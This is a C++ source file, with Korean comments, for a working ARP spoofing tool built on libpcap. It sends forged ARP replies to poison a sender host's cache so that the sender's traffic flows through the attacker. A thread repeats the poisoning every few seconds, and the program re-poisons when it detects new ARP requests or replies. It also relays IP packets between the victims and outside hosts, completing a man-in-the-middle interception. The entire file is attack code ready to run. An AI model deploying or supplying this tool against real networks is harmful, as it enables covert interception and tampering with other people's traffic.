#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <pcap.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#define PERIOD_REINFECTION 5 
#define MAX_ATTEMPT_RECEIVE 10000
#define MAX_SNAPLEN 65535 // attempt to cover jumbo frame

Mac my_mac;
Ip  my_ip;

void usage() {
    printf("syntax: arp‑spoof <interface> <sender ip> <target ip> [<sender ip2> <target ip2>...]\n");
    printf("sample : arp‑spoof wlan0 192.168.10.2 192.168.10.1\n");
}

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct connection {
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

struct thread_argument{
    pcap_t* handle;
    connection* connections;
    int connection_count;
};

bool get_my_mac(Mac* mac, const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); return false; }
    ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { perror("ioctl"); close(fd); return false; }
    *mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
    close(fd);
    return true;
}

bool get_my_ip(Ip* ip, const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); return false; }
    ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { perror("ioctl"); close(fd); return false; }
    struct sockaddr_in* sin = (sockaddr_in*)&ifr.ifr_addr;
    *ip = Ip(ntohl(sin->sin_addr.s_addr));
    close(fd);
    return true;
}

bool send_arp(pcap_t* h,
              Mac eth_s, Mac eth_d,
              Mac arp_s, Mac arp_t,
              Ip  sip,   Ip  tip,
              bool is_request)
{
    EthArpPacket p;
    p.eth_.smac_ = eth_s;
    p.eth_.dmac_ = eth_d;
    p.eth_.type_ = htons(EthHdr::Arp);

    p.arp_.hrd_  = htons(ArpHdr::ETHER);
    p.arp_.pro_  = htons(EthHdr::Ip4);
    p.arp_.hln_  = Mac::Size;
    p.arp_.pln_  = Ip::Size;
    p.arp_.op_   = is_request ? htons(ArpHdr::Request)
                              : htons(ArpHdr::Reply);
    p.arp_.smac_ = arp_s;
    p.arp_.sip_  = htonl(sip);
    p.arp_.tmac_ = arp_t;
    p.arp_.tip_  = htonl(tip);

    if (pcap_sendpacket(h, (u_char*)&p, sizeof(p)) != 0) {
        fprintf(stderr, "[ERROR] send_arp: %s\n", pcap_geterr(h));
        return false;
    }
    return true;
}

bool recv_arp(pcap_t* h, Mac my_mac, Ip want_sip, Ip want_tip, Mac* out_mac) {
    pcap_pkthdr* hdr;
    const u_char* buf;
    for (int i = 0; i < MAX_ATTEMPT_RECEIVE; i++) {
        if (pcap_next_ex(h, &hdr, &buf) <= 0) continue;
        EthHdr* eth = (EthHdr*)buf;
        if (eth->type() != EthHdr::Arp) continue;
        ArpHdr* arp = (ArpHdr*)(buf + sizeof(EthHdr));
        if (ntohs(arp->op_) != ArpHdr::Reply) continue;
        if (ntohl(arp->sip_) != want_sip) continue;
        if (ntohl(arp->tip_) != want_tip) continue;
        *out_mac = arp->smac();
        return true;
    }
    return false;
}

bool get_mac(pcap_t* h, Mac my_mac, Ip my_ip, Ip qip, Mac* out_mac) {
    Mac null_mac("00:00:00:00:00:00");
    Mac broadcast_mac("ff:ff:ff:ff:ff:ff");
    if (!send_arp(h, my_mac, broadcast_mac, my_mac, null_mac, my_ip, qip, true)) return false;
    return recv_arp(h, my_mac, qip, my_ip, out_mac);
}

void* re_infect(void* arg) {
    thread_argument* ta = (thread_argument*)arg;
    while (true) {
        sleep(PERIOD_REINFECTION);
        for (int i = 0; i < ta->connection_count; i++) {
            connection &f = ta->connections[i];
            send_arp(ta->handle,
                     my_mac, f.sender_mac,
                     my_mac, f.sender_mac,
                     f.target_ip, f.sender_ip,
                     false);
            printf("[*] Connection %d: Periodic Re-Infection Complete\n", i+1);
        }
    }
    return nullptr;
}

bool relay_packet(pcap_t* h, const u_char* buf, int len, Mac ns, Mac nd) {
    u_char* m = new u_char[len];
    memcpy(m, buf, len);
    EthHdr* eth = (EthHdr*)m;
    eth->smac_ = ns;
    eth->dmac_ = nd;
    int r = pcap_sendpacket(h, m, len);
    delete[] m;
    if (r != 0) {
        fprintf(stderr, "[ERROR] relay: %s\n", pcap_geterr(h));
        return false;
    }
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }
    const char* dev = argv[1];

    if (!get_my_ip(&my_ip, dev) || !get_my_mac(&my_mac, dev)) {
        fprintf(stderr, "[ERROR] cannot get local IP/MAC\n");
        return EXIT_FAILURE;
    }

    char err[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, MAX_SNAPLEN, 1, 1000, err);
    if (!handle) {
        fprintf(stderr, "[ERROR] pcap_open_live: %s\n", err);
        return EXIT_FAILURE;
    }
    /* Ethernet MTU 자체는 기본 1500B, jumbo frame은 보통 9000B 정도까지 설정됨.
       snaplen을 65535로 잡으면 이론상 최대 IP 패킷 크기(65 535B)”를 전부 받아올 수 있어서
       jumbo frame(9000B~12000B)도 전혀 문제 없이 온전하게 캡처·송출 가능할 것으로 예상 
       65536 byte 버퍼만 추가할당하므로 큰 문제 없음 */

    printf("==================================================\n");
    printf("[*] My IP address : %s\n", std::string(my_ip).data());
    printf("[*] My MAC address: %s\n", std::string(my_mac).data());
    printf("==================================================\n");

    int connection_count = (argc - 2) / 2;
    connection* connections = new connection[connection_count];

    // 초기 ARP 정보 수집 & 감염
    for (int i = 0; i < connection_count; i++) {
        connections[i].sender_ip = Ip(argv[2*i + 2]);
        connections[i].target_ip = Ip(argv[2*i + 3]);

        get_mac(handle, my_mac, my_ip,
                connections[i].sender_ip, &connections[i].sender_mac);
        get_mac(handle, my_mac, my_ip,
                connections[i].target_ip, &connections[i].target_mac);

        printf("==================================================\n");
        printf("[*] Connection %d:\n", i+1);
        printf("    Sender IP   : %s\n", std::string(connections[i].sender_ip).data());
        printf("    Sender MAC  : %s\n", std::string(connections[i].sender_mac).data());
        printf("    Target IP   : %s\n", std::string(connections[i].target_ip).data());
        printf("    Target MAC  : %s\n", std::string(connections[i].target_mac).data());
    }
    printf("==================================================\n");

    // 최초 감염
    for (int i = 0; i < connection_count; i++) {
        send_arp(handle,
                 my_mac, connections[i].sender_mac,
                 my_mac, connections[i].sender_mac,
                 connections[i].target_ip, connections[i].sender_ip,
                 false);
    }

    // 재감염 스레드 시작
    thread_argument ta{handle, connections, connection_count};
    pthread_t tid;
    pthread_create(&tid, nullptr, re_infect, &ta);

    // ARP spoof 시점 탐지 및 relay 루프
    pcap_pkthdr* hdr;
    const u_char* pkt;
    while (true) {
        if (pcap_next_ex(handle, &hdr, &pkt) <= 0) continue;
        EthHdr* eth = (EthHdr*)pkt;
        if (ntohs(eth->type_) == EthHdr::Ip4){
            IpHdr* ip = (IpHdr*)(pkt + sizeof(EthHdr));
            for (int i = 0; i < connection_count; i++) {
                // 1) sender → target
                if (ip->sip() == connections[i].sender_ip &&
                    ip->dip() == connections[i].target_ip) 
                {
                    //printf("[*] Connection %d: Relay (Sender → Target) \n", i+1);
                    relay_packet(handle, pkt, hdr->caplen,
                                my_mac, connections[i].target_mac);
                }
                // 2) target → sender
                else if (ip->sip() == connections[i].target_ip &&
                        ip->dip() == connections[i].sender_ip)
                {
                    //printf("[*] Connection %d: Relay (Target → Sender) \n", i+1);
                    relay_packet(handle, pkt, hdr->caplen,
                                my_mac, connections[i].sender_mac);
                }
                // 3) sender → outside
                else if (ip->sip() == connections[i].sender_ip &&
                        ip->dip() != connections[i].target_ip &&
                        ip->dip() != my_ip)
                {
                    //printf("[*] Connection %d: Relay (Sender → Outside) \n", i+1);
                    relay_packet(handle, pkt, hdr->caplen,
                                my_mac, connections[i].target_mac);
                }
                // 4) outside → sender
                else if (ip->dip() == connections[i].sender_ip &&
                        ip->sip() != connections[i].target_ip)
                {
                    //printf("[*] Connection %d: Relay (Outside → Sender) \n", i+1);
                    relay_packet(handle, pkt, hdr->caplen,
                                my_mac, connections[i].sender_mac);
                }
            }
        }
        else if (ntohs(eth->type_) == EthHdr::Arp) {
            // 1) ARP 헤더 Parsing
            ArpHdr* arp_hdr = (ArpHdr*)(pkt + sizeof(EthHdr));
            uint16_t op  = ntohs(arp_hdr->op_);
            Ip       sip = ntohl(arp_hdr->sip_);
            Ip       tip = ntohl(arp_hdr->tip_);
            Mac      smac = arp_hdr->smac_;
            Mac      tmac = arp_hdr->tmac_;
        
            // 2) 디버그: ARP 트래픽이 실제로 잡히는지 확인 
            /*printf("[DEBUG] ARP pkt: op=%s sip=%s tip=%s smac=%s tmac=%s\n",
                   op == ArpHdr::Request ? "REQ" :
                   op == ArpHdr::Reply   ? "REP" : "UNK",
                   std::string(sip).c_str(),
                   std::string(tip).c_str(),
                   std::string(smac).c_str(),
                   std::string(tmac).c_str());
            fflush(stdout);*/
        
            // 3) 각 connection에 대해 재감염 판단
            for (int i = 0; i < connection_count; ++i) {
                connection &c = connections[i];
        
                // sender가 target을 묻는 Request
                if (op == ArpHdr::Request && sip == c.sender_ip && tip == c.target_ip) {
                    send_arp(handle,
                             my_mac,       // eth src
                             c.sender_mac, // eth dst (sender)
                             my_mac,       // arp src mac (attacker)
                             c.sender_mac, // arp dst mac (sender)
                             c.target_ip,  // spoofed sender IP
                             c.sender_ip,  // sender IP
                             false);       // Reply
                    printf("[*] Connection %d: Request Detected → Re-Infected\n", i+1);
                    fflush(stdout);
                }
                // target에서 보내는 Reply
                else if (op == ArpHdr::Reply
                      && sip == c.target_ip
                      && tip == c.sender_ip
                      && smac == c.target_mac)
                {
                    send_arp(handle,
                             my_mac,
                             c.sender_mac,
                             my_mac,
                             c.sender_mac,
                             c.target_ip,
                             c.sender_ip,
                             false);
                    printf("[*] Connection %d: Reply Detected → Re-Infected\n", i+1);
                    fflush(stdout);
                }
            }
        }
    }

    delete[] connections;
    pcap_close(handle);
    pthread_detach(tid);
    return 0;
}

